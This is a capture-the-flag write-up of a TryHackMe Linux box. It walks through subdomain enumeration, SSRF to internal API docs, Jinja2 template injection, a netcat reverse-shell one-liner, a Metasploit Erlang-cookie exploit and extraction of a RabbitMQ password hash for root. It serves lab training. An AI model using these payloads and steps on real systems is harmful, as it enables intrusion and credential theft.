![Capture d'écran 2025-03-01 124932](https://github.com/user-attachments/assets/624e490f-3483-40ca-9fb1-5021b705e7d9)

Demonstrate your web application testing skills and the basics of Linux to escalate your privileges.

This machine is part of **TryHackMe** and is categorized as a **medium**-level Linux box. It offers a great learning opportunity by combining **web enumeration, SSRF exploitation and privilege escalation**. The challenge revolves around exploring a web application, uncovering misconfigurations, and leveraging them to gain root access. Let’s dive in!

---

### Recon

To start, we add the target's IP address to our `/etc/hosts` file and perform a full port scan using **nmap** :
```
nmap 10.10.9.16 -sV -sC -p- -oN nmapres
```

![Capture d'écran 2025-03-01 130227](https://github.com/user-attachments/assets/bf2ff360-3615-4032-a116-53c7a93eedf4)

The scan reveals four open ports :

-  `22/tcp` : using `ssh` service
-  `80/tcp` : using `http` service. But we can see that we are redirected to `http://cloudsite.thm`
-  `4369/tcp` : using `empd` service
-  `25672/tcp` : using an `unknow` service

After adding `cloudsite.thm` to `/etc/hosts`, we continue enumeration using **Gobuster** :

```
gobuster dir -u cloudsite.thm  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt > gobusteres
```

![Capture d'écran 2025-03-01 132436](https://github.com/user-attachments/assets/8baba82b-3815-401d-8dfe-fad470a55991)

This reveals two directories :

- `http://cloudsite.thm/assets/`
- `http://cloudiste.thm/jaavscript/`

We continue subdomain enumeration with **ffuf** :

```
ffuf -u http://cloudsite.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.cloudsite.thm" -fw 18
```

![Capture d'écran 2025-03-01 132958](https://github.com/user-attachments/assets/ba484a0f-8880-4d08-833b-0696e9375239)

This reveals a new subdomain: `storage.cloudsite.thm`. After updating `/etc/hosts`, we access the **Storage** website, where we can register an account.

---

### Initial foothold

We can now access to the website : 

![Capture d'écran 2025-03-01 142346](https://github.com/user-attachments/assets/a25784e4-2ab3-4340-9d11-3ac5d9454980)

From there we can **create** an account : 

![Capture d'écran 2025-03-01 142648](https://github.com/user-attachments/assets/d8acdbd6-19d1-4114-b52a-5d36913967aa)

Once logged in, we can see a message stating that an administrator must activate our account subscription :

![Capture d'écran 2025-03-01 144531](https://github.com/user-attachments/assets/2a3a2b59-2afb-4827-9983-99c37ef94732)

To continue our enumeration, we use **Gobuster** on `/dashboard/` to discover directories : 

```
gobuster dir -u storage.cloudsite.thm/dashboard  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt > gobusteres
```

![Capture d'écran 2025-03-01 152326](https://github.com/user-attachments/assets/21b48104-ce1e-40e8-80dd-2999d44c9fc5)

And we found three subdirectories : 
- active
- inactive
- Active

Using **Burp Suite** we can see the `Cookie` field with a `jwt` value.

![Capture d'écran 2025-03-01 145354](https://github.com/user-attachments/assets/461e0ebe-942a-407c-9185-62df96f76938)

So we can analyze the content of the `jwt` value by using `jwt.io`  :

![Capture d'écran 2025-03-01 145629](https://github.com/user-attachments/assets/c6c8c53e-59e2-4838-aa3f-dfe9e34b3e31)

As shown in the screen above, the cookie stores four elements : 

- `email` : "test@gmail[.]com"
- `subscription` : "inactive"
- `iat` : 1740835657
- `exp` : 1740839257

We might wonder what would happen if we modified the cookie to set the `subscription` field to `active`. However, since we don't have the **secret key**, we can't directly edit the payload. Instead, we can try adding this information to the `register` form.

![Capture d'écran 2025-03-01 151928](https://github.com/user-attachments/assets/d315653e-2db9-4386-8451-9c570f6c91bc)

We successfully created an new account with the `subscription` field set to `active`.

Once logged in, we can see that we have access to a new page `storage.cloudsite.thm/dashboard/activate` : 

![Capture d'écran 2025-03-01 152051](https://github.com/user-attachments/assets/1ac5523e-bd5b-45bc-a1f0-98897762c69d)

![Capture d'écran 2025-03-01 154543](https://github.com/user-attachments/assets/d5709abf-0e3e-49bc-961f-814ea460aac7)

We can attempt to send a **GET** request to our local machine to check if it responds : 

![Capture d'écran 2025-03-01 161653](https://github.com/user-attachments/assets/d043e6d9-3012-4fc4-8b72-872228b45774)

![Capture d'écran 2025-03-01 161715](https://github.com/user-attachments/assets/14e18a77-416e-44fa-acc8-ed350883b142)

As we can see, it's works and we can also see that we have a `/api/uploads` subdirectory. Let's make an enumeration with **gobuster** : 

```
gobuster dir -u storage.cloudsite.thm/api/  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt > gobusteres4
```

![Capture d'écran 2025-03-01 162551](https://github.com/user-attachments/assets/4b981fad-6895-4247-824f-42f34f093fe2)

We discovered several subdirectories, including `docs` (HTTP 403: Forbidden), which we can attempt to access through a **SSRF** (Server-Side Request Forgery) attack.

Using **Wappanalyzer** we can found that the server is using **Express** framework : 

![Capture d'écran 2025-03-01 162813](https://github.com/user-attachments/assets/aa6865af-d1ca-4142-a7c1-4225dcc43351)

Let's check if we can access these subdirectories by targeting port 3000, the default port for the Express framework.

![Capture d'écran 2025-03-01 163618](https://github.com/user-attachments/assets/19ce748b-cff2-4b7e-b26f-b4b4fb9a70d6)

Now, we can attempt to download the file to inspect its content : 

![Capture d'écran 2025-03-01 163712](https://github.com/user-attachments/assets/850d627f-efd0-4cf4-8e95-d2fad9f6dca1)

Now we have access to the documentation and we discovered different **endpoints** such as  `/api/fetch_messages_from_chatbot` which is a new one. Moreover, we can see a **Note** at the end that tells us that all requests need to be and sent in **JSON** format.

![Capture d'écran 2025-03-01 164309](https://github.com/user-attachments/assets/26d7f45a-5db3-4cf8-80d2-aeb54fa11135)

We can attempt to send a **POST** request to the endpoint, and the response indicates that a **username** parameter is required :

![Capture d'écran 2025-03-01 170000](https://github.com/user-attachments/assets/3e47b470-bd36-4838-b819-73988ea6c7cb)

After testing various payloads, we discovered that the webpage is vulnerable to **SSTI (Server-Side Template Injection)**, specifically using the **Jinja2** template engine :

![Capture d'écran 2025-03-01 181444](https://github.com/user-attachments/assets/fb62005e-244b-4671-85a7-16313482ef8b)

![Capture d'écran 2025-03-01 182638](https://github.com/user-attachments/assets/e8984c36-6155-4635-953e-2d5b9e22d05a)


---
### Exploitation - Gaining shell access

Based on the response, we could attempt to establish a connection to our local machine : 

![Capture d'écran 2025-03-01 171801](https://github.com/user-attachments/assets/6c028540-302d-4d66-955f-a407f5304e92)

![Capture d'écran 2025-03-01 172902](https://github.com/user-attachments/assets/c9c72462-58bf-4cec-a5ad-b87ac5d8bf7f)

Now that we've confirmed the ability to inject code into the `username` parameter, we can attempt to obtain a **reverse shell** using [revshells.com](https://www.revshells.com/) : 

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> <port> >/tmp/f
```

![Capture d'écran 2025-03-01 183502](https://github.com/user-attachments/assets/31fa1803-eeb3-4455-9e17-90d61a224dcc)

![Capture d'écran 2025-03-01 183901](https://github.com/user-attachments/assets/53361c66-506e-4e0d-a0ba-db15bd9b15bb)

And we get a reverse shell ! 

Now that we have access, we can retrieve the **user** flag : 

![Capture d'écran 2025-03-01 183950](https://github.com/user-attachments/assets/91aad717-b8bc-4bbb-88db-b6125de53590)

![Capture d'écran 2025-03-01 230612](https://github.com/user-attachments/assets/35f8b759-46b6-4e94-abd7-33fb940e7d87)

---
### Privilege escalation

While enumerating, we find an **Erlang Cookie** file at `/etc/bli/rabbitmq/.erlang.cookie`  :

![Capture d'écran 2025-03-01 195642](https://github.com/user-attachments/assets/1e1ab808-fa6a-4143-9490-ec8685c4d55b)

We use **Metasploit** to exploit this for **Remote Code Execution (RCE)** :

```
use exploit/multi/misc/erlang_cookie_rce
set COOKIE <erlang_cookie>
set RHOSTS <target_ip>
set LHOST <local_ip>
set LPORT <local_port>
run
```

![Capture d'écran 2025-03-01 201646](https://github.com/user-attachments/assets/7be207c9-05da-4163-9953-80f544830cfd)

So now we can use  `rabbitmqctl` command but first, we need to edit the permission file of `.erlang.cookie` : 

![Capture d'écran 2025-03-01 202558](https://github.com/user-attachments/assets/6607760f-bd6d-4846-accc-e249dfd2d249)
![Capture d'écran 2025-03-01 202756](https://github.com/user-attachments/assets/c68a4840-d4cc-4fa4-addb-c30dd1987104)

We now have permission to list all RabbitMQ users :

![Capture d'écran 2025-03-01 202939](https://github.com/user-attachments/assets/1ea8996c-fdca-4a76-8ac4-ce0595a9ad34)

We extract RabbitMQ **password hashes** using : 

```
rabbitmqctl export_definitions /tmp/rabbitmq.json
```

![Capture d'écran 2025-03-01 203656](https://github.com/user-attachments/assets/9a4eab4f-a129-4989-83c1-817f6b61e4e8)

Then, we pretty-print the JSON file to locate the administrator’s password hash : 

```
python3 -m json.tool /tmp/rabbitmq.json
```

![Capture d'écran 2025-03-01 230831](https://github.com/user-attachments/assets/3f71f0ac-24eb-407e-909f-7861c129a956)

According to the RabbitMQ documentation, we can understand how the hash is constructed : 

> [RabbitMQ](https://www.rabbitmq.com/docs/passwords#changing-algorithm) :
> ### This is the algorithm:[​](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm "Direct link to This is the algorithm:")
> - Generate a random 32 bit salt. In this example, we will use `908D C60A`. When RabbitMQ creates or updates a user, a random salt is generated.
> - Prepend the generated salt with the UTF-8 representation of the desired password. If the password is `test12`, at this step, the intermediate result would be `908D C60A 7465 7374 3132`
> - Take the hash (this example assumes the default [hashing function](https://www.rabbitmq.com/docs/passwords#changing-algorithm), SHA-256): `A5B9 24B3 096B 8897 D65A 3B5F 80FA 5DB62 A94 B831 22CD F4F8 FEAD 10D5 15D8 F391`
> - Prepend the salt again: `908D C60A A5B9 24B3 096B 8897 D65A 3B5F 80FA 5DB62 A94 B831 22CD F4F8 FEAD 10D5 15D8 F391`
> - Convert the value to base64 encoding: `kI3GCqW5JLMJa4iX1lo7X4D6XbYqlLgxIs30+P6tENUV2POR`
> - Use the finaly base64-encoded value as the `password_hash` value in HTTP API requests and generated definition files

To retrieve the `SHA256` hash, we can run the following code : 

```
import base64
import binascii

# Base64-encoded RabbitMQ password hash 
rabbitmq_hash = <hash>  

# First we need to decode the Base64-encoded hash
decoded = base64.b64decode(rabbitmq_hash)

# Then extract the remaining bytes (SHA-256 hash) without the first 4 bytes (salt)
hash_value = decoded[4:]  

# Print the extracted SHA-256 hash in hexadecimal format
print(f"SHA-256 Hash : {binascii.hexlify(hash_value).decode()}")
```

By executing the code, we obtain the hash, which also serves as the `root` **password** :

![Capture d'écran 2025-03-01 230936](https://github.com/user-attachments/assets/f98f33a7-8496-4133-a685-9b407dbc9792)

--- 
### Root access 

We switch to the **root** user :

![Capture d'écran 2025-03-01 220416](https://github.com/user-attachments/assets/4962c12b-f9e0-46b0-acc7-d53d336cc3ff)

And retrieve the **root flag** :

![Capture d'écran 2025-03-01 231404](https://github.com/user-attachments/assets/0879e559-05c1-48c1-aa70-13914ef662d4)

---

**Congratulations!** I hope you found this writeup insightful. This CTF was an excellent challenge that emphasized the importance of **enumeration**, from uncovering subdomains and exploiting SSRF to leveraging RabbitMQ misconfigurations for privilege escalation. It showcased how persistence and creativity play a crucial role in penetration testing..

Thanks for reading, and happy hacking!

![Capture d'écran 2025-03-01 221132](https://github.com/user-attachments/assets/25720f63-02b5-46b9-b140-ee4cfd2fbd93)
